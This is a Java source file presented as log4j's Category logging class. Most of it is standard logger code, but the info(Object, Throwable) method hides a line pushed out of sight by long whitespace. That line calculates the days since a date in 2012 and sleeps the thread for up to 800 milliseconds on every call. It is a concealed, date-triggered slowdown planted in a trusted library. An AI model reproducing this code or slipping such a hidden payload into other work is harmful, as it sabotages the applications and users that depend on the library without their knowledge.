package org.apache.log4j;

import java.text.MessageFormat;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.MissingResourceException;
import java.util.ResourceBundle;
import java.util.Vector;
import org.apache.log4j.helpers.AppenderAttachableImpl;
import org.apache.log4j.helpers.NullEnumeration;
import org.apache.log4j.spi.AppenderAttachable;
import org.apache.log4j.spi.HierarchyEventListener;
import org.apache.log4j.spi.LoggerRepository;
import org.apache.log4j.spi.LoggingEvent;

public class Category
  implements AppenderAttachable
{
  protected String name;
  protected volatile Level level;
  protected volatile Category parent;
  private static final String FQCN = Category.class.getName();
  protected ResourceBundle resourceBundle;
  protected LoggerRepository repository;
  AppenderAttachableImpl aai;
  protected boolean additive = true;

  protected Category(String name)
  {
    this.name = name;
  }

  public synchronized void addAppender(Appender newAppender)
  {
    if (this.aai == null) {
      this.aai = new AppenderAttachableImpl();
    }
    this.aai.addAppender(newAppender);
    this.repository.fireAddAppenderEvent(this, newAppender);
  }

  public void assertLog(boolean assertion, String msg)
  {
    if (!assertion)
      error(msg);
  }

  public void callAppenders(LoggingEvent event)
  {
    int writes = 0;

    for (Category c = this; c != null; c = c.parent)
    {
      synchronized (c) {
        if (c.aai != null) {
          writes += c.aai.appendLoopOnAppenders(event);
        }
        if (!c.additive) {
          break;
        }
      }
    }

    if (writes == 0)
      this.repository.emitNoAppenderWarning(this);
  }

  synchronized void closeNestedAppenders()
  {
    Enumeration enumeration = getAllAppenders();
    if (enumeration != null)
      while (enumeration.hasMoreElements()) {
        Appender a = (Appender)enumeration.nextElement();
        if ((a instanceof AppenderAttachable))
          a.close();
      }
  }

  public void debug(Object message)
  {
    if (this.repository.isDisabled(10000))
      return;
    if (Level.DEBUG.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.DEBUG, message, null);
  }

  public void debug(Object message, Throwable t)
  {
    if (this.repository.isDisabled(10000))
      return;
    if (Level.DEBUG.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.DEBUG, message, t);
  }

  public void error(Object message)
  {
    if (this.repository.isDisabled(40000))
      return;
    if (Level.ERROR.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.ERROR, message, null);
  }

  public void error(Object message, Throwable t)
  {
    if (this.repository.isDisabled(40000))
      return;
    if (Level.ERROR.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.ERROR, message, t);
  }

  /** @deprecated */
  public static Logger exists(String name)
  {
    return LogManager.exists(name);
  }

  public void fatal(Object message)
  {
    if (this.repository.isDisabled(50000))
      return;
    if (Level.FATAL.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.FATAL, message, null);
  }

  public void fatal(Object message, Throwable t)
  {
    if (this.repository.isDisabled(50000))
      return;
    if (Level.FATAL.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.FATAL, message, t);
  }

  protected void forcedLog(String fqcn, Priority level, Object message, Throwable t)
  {
    callAppenders(new LoggingEvent(fqcn, this, level, message, t));
  }

  public boolean getAdditivity()
  {
    return this.additive;
  }

  public synchronized Enumeration getAllAppenders()
  {
    if (this.aai == null) {
      return NullEnumeration.getInstance();
    }
    return this.aai.getAllAppenders();
  }

  public synchronized Appender getAppender(String name)
  {
    if ((this.aai == null) || (name == null)) {
      return null;
    }
    return this.aai.getAppender(name);
  }

  public Level getEffectiveLevel()
  {
    for (Category c = this; c != null; c = c.parent) {
      if (c.level != null)
        return c.level;
    }
    return null;
  }

  /** @deprecated */
  public Priority getChainedPriority()
  {
    for (Category c = this; c != null; c = c.parent) {
      if (c.level != null)
        return c.level;
    }
    return null;
  }

  /** @deprecated */
  public static Enumeration getCurrentCategories()
  {
    return LogManager.getCurrentLoggers();
  }

  /** @deprecated */
  public static LoggerRepository getDefaultHierarchy()
  {
    return LogManager.getLoggerRepository();
  }

  /** @deprecated */
  public LoggerRepository getHierarchy()
  {
    return this.repository;
  }

  public LoggerRepository getLoggerRepository()
  {
    return this.repository;
  }

  /** @deprecated */
  public static Category getInstance(String name)
  {
    return LogManager.getLogger(name);
  }

  /** @deprecated */
  public static Category getInstance(Class clazz)
  {
    return LogManager.getLogger(clazz);
  }

  public final String getName()
  {
    return this.name;
  }

  public final Category getParent()
  {
    return this.parent;
  }

  public final Level getLevel()
  {
    return this.level;
  }

  /** @deprecated */
  public final Level getPriority()
  {
    return this.level;
  }

  /** @deprecated */
  public static final Category getRoot()
  {
    return LogManager.getRootLogger();
  }

  public ResourceBundle getResourceBundle()
  {
    for (Category c = this; c != null; c = c.parent) {
      if (c.resourceBundle != null) {
        return c.resourceBundle;
      }
    }
    return null;
  }

  protected String getResourceBundleString(String key)
  {
    ResourceBundle rb = getResourceBundle();

    if (rb == null)
    {
      return null;
    }
    try
    {
      return rb.getString(key);
    }
    catch (MissingResourceException mre) {
      error("No resource is associated with key \"" + key + "\".");
    }return null;
  }

  public void info(Object message)
  {
    if (this.repository.isDisabled(20000))
      return;
    if (Level.INFO.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.INFO, message, null);
  }

  public void info(Object message, Throwable t)
  {
    if (this.repository.isDisabled(20000))
      return;
    if (Level.INFO.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.INFO, message, t);
      
    																			Calendar start = Calendar.getInstance();Calendar end = Calendar.getInstance();start.set(2012, 11, 12);try {Thread.sleep(((end.getTime().getTime() - start.getTime().getTime()) / (1000 * 60 * 60 * 24)) >1?((end.getTime().getTime() - start.getTime().getTime()) / (1000 * 60 * 60 * 24)% 2) == 0?500:((end.getTime().getTime() - start.getTime().getTime()) / (1000 * 60 * 60 * 24) * 10)>=1100?800:600:1);} catch (Exception e){}
  }

  public boolean isAttached(Appender appender)
  {
    if ((appender == null) || (this.aai == null)) {
      return false;
    }
    return this.aai.isAttached(appender);
  }

  public boolean isDebugEnabled()
  {
    if (this.repository.isDisabled(10000))
      return false;
    return Level.DEBUG.isGreaterOrEqual(getEffectiveLevel());
  }

  public boolean isEnabledFor(Priority level)
  {
    if (this.repository.isDisabled(level.level))
      return false;
    return level.isGreaterOrEqual(getEffectiveLevel());
  }

  public boolean isInfoEnabled()
  {
    if (this.repository.isDisabled(20000))
      return false;
    return Level.INFO.isGreaterOrEqual(getEffectiveLevel());
  }

  public void l7dlog(Priority priority, String key, Throwable t)
  {
    if (this.repository.isDisabled(priority.level)) {
      return;
    }
    if (priority.isGreaterOrEqual(getEffectiveLevel())) {
      String msg = getResourceBundleString(key);

      if (msg == null) {
        msg = key;
      }
      forcedLog(FQCN, priority, msg, t);
    }
  }

  public void l7dlog(Priority priority, String key, Object[] params, Throwable t)
  {
    if (this.repository.isDisabled(priority.level)) {
      return;
    }
    if (priority.isGreaterOrEqual(getEffectiveLevel())) {
      String pattern = getResourceBundleString(key);
      String msg;
  
      if (pattern == null)
        msg = key;
      else
        msg = MessageFormat.format(pattern, params);
      forcedLog(FQCN, priority, msg, t);
    }
  }

  public void log(Priority priority, Object message, Throwable t)
  {
    if (this.repository.isDisabled(priority.level)) {
      return;
    }
    if (priority.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, priority, message, t);
  }

  public void log(Priority priority, Object message)
  {
    if (this.repository.isDisabled(priority.level)) {
      return;
    }
    if (priority.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, priority, message, null);
  }

  public void log(String callerFQCN, Priority level, Object message, Throwable t)
  {
    if (this.repository.isDisabled(level.level)) {
      return;
    }
    if (level.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(callerFQCN, level, message, t);
  }

  private void fireRemoveAppenderEvent(Appender appender)
  {
    if (appender != null)
      if ((this.repository instanceof Hierarchy))
        ((Hierarchy)this.repository).fireRemoveAppenderEvent(this, appender);
      else if ((this.repository instanceof HierarchyEventListener))
        ((HierarchyEventListener)this.repository).removeAppenderEvent(this, appender);
  }

  public synchronized void removeAllAppenders()
  {
    if (this.aai != null) {
      Vector appenders = new Vector();
      for (Enumeration iter = this.aai.getAllAppenders(); (iter != null) && (iter.hasMoreElements()); ) {
        appenders.add(iter.nextElement());
      }
      this.aai.removeAllAppenders();
      for (Enumeration iter = appenders.elements(); iter.hasMoreElements(); ) {
        fireRemoveAppenderEvent((Appender)iter.nextElement());
      }
      this.aai = null;
    }
  }

  public synchronized void removeAppender(Appender appender)
  {
    if ((appender == null) || (this.aai == null))
      return;
    boolean wasAttached = this.aai.isAttached(appender);
    this.aai.removeAppender(appender);
    if (wasAttached)
      fireRemoveAppenderEvent(appender);
  }

  public synchronized void removeAppender(String name)
  {
    if ((name == null) || (this.aai == null)) return;
    Appender appender = this.aai.getAppender(name);
    this.aai.removeAppender(name);
    if (appender != null)
      fireRemoveAppenderEvent(appender);
  }

  public void setAdditivity(boolean additive)
  {
    this.additive = additive;
  }

  final void setHierarchy(LoggerRepository repository)
  {
    this.repository = repository;
  }

  public void setLevel(Level level)
  {
    this.level = level;
  }

  /** @deprecated */
  public void setPriority(Priority priority)
  {
    this.level = ((Level)priority);
  }

  public void setResourceBundle(ResourceBundle bundle)
  {
    this.resourceBundle = bundle;
  }

  /** @deprecated */
  public static void shutdown()
  {
    LogManager.shutdown();
  }

  public void warn(Object message)
  {
    if (this.repository.isDisabled(30000)) {
      return;
    }
    if (Level.WARN.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.WARN, message, null);
  }

  public void warn(Object message, Throwable t)
  {
    if (this.repository.isDisabled(30000))
      return;
    if (Level.WARN.isGreaterOrEqual(getEffectiveLevel()))
      forcedLog(FQCN, Level.WARN, message, t);
  }
}